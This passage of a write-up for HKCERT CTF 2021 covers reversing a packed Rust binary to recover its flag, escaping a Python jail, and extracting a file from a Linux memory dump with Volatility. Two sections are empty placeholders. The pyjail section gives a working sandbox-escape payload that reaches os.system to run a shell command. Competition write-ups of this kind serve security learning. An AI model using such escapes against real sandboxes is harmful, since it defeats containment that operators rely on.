   0x80147c6 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+390>:     jne    0x8014824 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+484>
   0x80147c8 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+392>:     cmp    rbx,0x2
   0x80147cc <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+396>:     jae    0x80148b7 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+631>
   0x80147d2 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+402>:     mov    esi,0x1
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x7ffffffedf10
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```
7. Noted that the comparison do not require any transformation like XOR, disassemble current function by running `pdis` and find all lines like `cmp al,0x68`
```
	Line 94:    0x00000000080147c4 <+388>:   cmp    al,0x68
	Line 148:    0x00000000080148d8 <+664>:   cmp    al,0x6b
	Line 222:    0x00000000080149f7 <+951>:   cmp    al,0x63
	Line 241:    0x0000000008014a44 <+1028>:  cmp    al,0x65
	Line 260:    0x0000000008014a91 <+1105>:  cmp    al,0x72
	Line 279:    0x0000000008014ade <+1182>:  cmp    al,0x74
	Line 298:    0x0000000008014b2b <+1259>:  cmp    al,0x32
	Line 317:    0x0000000008014b78 <+1336>:  cmp    al,0x31
	Line 336:    0x0000000008014bc5 <+1413>:  cmp    al,0x7b
	Line 355:    0x0000000008014c12 <+1490>:  cmp    al,0x6a
	Line 385:    0x0000000008014ca3 <+1635>:  cmp    al,0x75
	Line 419:    0x0000000008014d4a <+1802>:  cmp    al,0x35
	Line 443:    0x0000000008014db5 <+1909>:  cmp    al,0x74
	Line 467:    0x0000000008014e20 <+2016>:  cmp    al,0x5f
	Line 491:    0x0000000008014e8b <+2123>:  cmp    al,0x73
	Line 515:    0x0000000008014ef6 <+2230>:  cmp    al,0x30
	Line 539:    0x0000000008014f61 <+2337>:  cmp    al,0x6d
	Line 563:    0x0000000008014fcc <+2444>:  cmp    al,0x33
	Line 587:    0x0000000008015037 <+2551>:  cmp    al,0x5f
	Line 611:    0x00000000080150a2 <+2658>:  cmp    al,0x35
	Line 635:    0x000000000801510d <+2765>:  cmp    al,0x69
	Line 659:    0x0000000008015178 <+2872>:  cmp    al,0x6d
	Line 683:    0x00000000080151e3 <+2979>:  cmp    al,0x50
	Line 707:    0x000000000801524e <+3086>:  cmp    al,0x31
	Line 731:    0x00000000080152b9 <+3193>:  cmp    al,0x33
	Line 755:    0x0000000008015324 <+3300>:  cmp    al,0x5f
	Line 779:    0x000000000801538f <+3407>:  cmp    al,0x75
	Line 803:    0x00000000080153fa <+3514>:  cmp    al,0x70
	Line 827:    0x0000000008015465 <+3621>:  cmp    al,0x78
	Line 896:    0x00000000080155de <+3998>:  cmp    al,0x26
	Line 920:    0x0000000008015645 <+4101>:  cmp    al,0x72
	Line 944:    0x00000000080156ac <+4204>:  cmp    al,0x75
	Line 968:    0x0000000008015713 <+4307>:  cmp    al,0x35
	Line 992:    0x000000000801577a <+4410>:  cmp    al,0x54
	Line 1016:    0x00000000080157e1 <+4513>:  cmp    al,0x5f
	Line 1040:    0x0000000008015848 <+4616>:  cmp    al,0x6d
	Line 1064:    0x00000000080158af <+4719>:  cmp    al,0x34
	Line 1088:    0x0000000008015916 <+4822>:  cmp    al,0x63
	Line 1112:    0x000000000801597d <+4925>:  cmp    al,0x72
	Line 1136:    0x00000000080159e4 <+5028>:  cmp    al,0x30
	Line 1160:    0x0000000008015a4b <+5131>:  cmp    al,0x5f
	Line 1184:    0x0000000008015ab2 <+5234>:  cmp    al,0x63
	Line 1208:    0x0000000008015b19 <+5337>:  cmp    al,0x30
	Line 1232:    0x0000000008015b80 <+5440>:  cmp    al,0x64
	Line 1256:    0x0000000008015be7 <+5543>:  cmp    al,0x33
	Line 1280:    0x0000000008015c4e <+5646>:  cmp    al,0x67
	Line 1304:    0x0000000008015cb5 <+5749>:  cmp    al,0x33
	Line 1328:    0x0000000008015d1c <+5852>:  cmp    al,0x6e
	Line 1352:    0x0000000008015d83 <+5955>:  cmp    al,0x7d
```
8. Extract the part after comma, decode the output with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg2OAoweDZiCjB4NjMKMHg2NQoweDcyCjB4NzQKMHgzMgoweDMxCjB4N2IKMHg2YQoweDc1CjB4MzUKMHg3NAoweDVmCjB4NzMKMHgzMAoweDZkCjB4MzMKMHg1ZgoweDM1CjB4NjkKMHg2ZAoweDUwCjB4MzEKMHgzMwoweDVmCjB4NzUKMHg3MAoweDc4CjB4MjYKMHg3MgoweDc1CjB4MzUKMHg1NAoweDVmCjB4NmQKMHgzNAoweDYzCjB4NzIKMHgzMAoweDVmCjB4NjMKMHgzMAoweDY0CjB4MzMKMHg2NwoweDMzCjB4NmUKMHg3ZA)

Flag: `hkcert21{ju5t_s0m3_5imP13_upx&ru5T_m4cr0_c0d3g3n}`  
  
## The Hardest Path (reverse 300 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{4lw4ys_l0ok_4t_s74ck_0verf1ow_wh3n_y0u_w4nt_t0_4v01d_s7ack_0v3rfl0ws}`  
  
## The Remaining One (pwn 300 pts)  
### Challenge:  
Find out the only one who always stand by you, that's the key of the escape.   
```
nc chalp.hkcert21.pwnable.hk 28005  
```
(ps. This question is part 2 of "All missing")   
### Solution:  
- First of all for pyjail1, after some researches I completed with below libraries suggested by this reference (https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#finding-dangerous-libraries-loaded). The final payload is below leveraging <class '_frozen_importlib._ModuleLock'>:
`().__class__.__base__.__subclasses__().pop(80).__init__.__globals__.pop('sys').modules.pop('os').system('cat flag.txt')`  
- The Remaining One is similar to a question in Plaid-CTF 2013 in a way that a While Loop is added to allow multiple inputs with additional filter (input length <= 59). See (https://github.com/osirislab/CTF-Challenges/blob/master/pctf2013/misc/pyjail/pyjail.py-ae426f39b325ed99123f590c8a8bbe224fefb406)  
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/images/hkcert21-theremainingone-1.png)  
- Realising methods under __builtins__ is still callable after __builtins__.__dict__.clear(), we can use the update method to temporary store and concatenate our previous payload  
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/images/hkcert21-theremainingone-2.png)  
(Reference: https://stackoverflow.com/questions/52221983/why-does-deleting-a-global-variable-named-builtins-prevent-only-the-repl-fro)  
- The final payloads after breaking into a few parts:  
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/images/hkcert21-theremainingone-3.png)  
- Sending the same payloads to target
  
Flag: `hkcert21{cr0sS_namesP4se__builtin__breaK_the_JAIL}`  
  
## Jack Botnet Service 1 郵差叔叔送信純熟迅速送出 1 (forensics 300 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{1_am_t3ch_5avvy}`  
  
## Difficult Choice (forensics 400 pts)  
### Challenge:  
> Gotta gotta gotta gotta  
> You gotta gotta gotta  
> Gotta gotta gotta gotta  
> You gotta make a choice  

My friend, Ken, was watching idol during his work. Please tell me which one is his oshi.  
The flag is located at `/home/user/Desktop/flag.jpg`.  
Hint: Linux Ubuntu 5.4.0.42

### Attachments
-   [difficult-choice_2fdc0e16be766592692bd9c5b07c6aaa.mem.xz](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/difficult-choice_2fdc0e16be766592692bd9c5b07c6aaa.mem.xz)
  
### Solution:  
- From the question description and hints I guessed this is a Volatility related forensic type question based on Linux dump. I only have experience with analysing Windows memory dump with Volatility 2 and I usually run the standalone version (an .exe file, as I don’t like to mess up my Python environment) on my Windows host machine. As a result running volatility’s imageinfo did not work as expected.
- As the hint did not mention the OS version, I tried a few official profiles from https://github.com/volatilityfoundation/profiles/tree/master/Linux/Ubuntu/x64 and that did not work on my Linux-Docker box
- Googled “volatility ubuntu 5.4.0-42 profile download” and located a useful script from the first result (https://github.com/hanasuru/vol_profile_builder). This script builds a Volatility profile for Ubuntu by providing OS and kernel versions.
- After some trial and error, found a reference on identifying profiles with a memory dump (https://heisenberk.github.io/Profile-Memory-Dump/). After that we can generate the profile using below command:
- `bash> ./build.sh 18.04 5.4.0-42-generic`
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/images/hkcert21-difficult-choice-1.png)
- Put the generated profiles in the right directory
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/assets/images/hkcert21-difficult-choice-2.png)
- Rerun Volatility in Linux with Python 2, included profiles shows up using the --info parameter.
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/assets/images/hkcert21-difficult-choice-3.png)
- Screenshot showing invalid output using an incorrect profile "LinuxUbubtu1804x64"
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/assets/images/hkcert21-difficult-choice-4.png)
- Rerun command with correctly identified profile “LinuxUbuntu18_04-5-4_0-42-genericx64” generated above
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/assets/images/hkcert21-difficult-choice-5.png)
- As the full path is given in the description, we just need to find the offset by command "linux_find_file"
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/assets/images/hkcert21-difficult-choice-6.png)
- Extract flag.jpg with the Inode info 
- `bash> python2 vol.py --profile LinuxUbuntu18_04-5_4_0-42-genericx64 -f difficult-choice_2fdc0e16be766592692bd9c5b07c6aaa.mem linux_find_file -i 0xffff9925b63a4df8 -O flag.jpg`


Flag: `hkcert21{y0u_4re_n0w_binwalk_m3st3r}`  
  
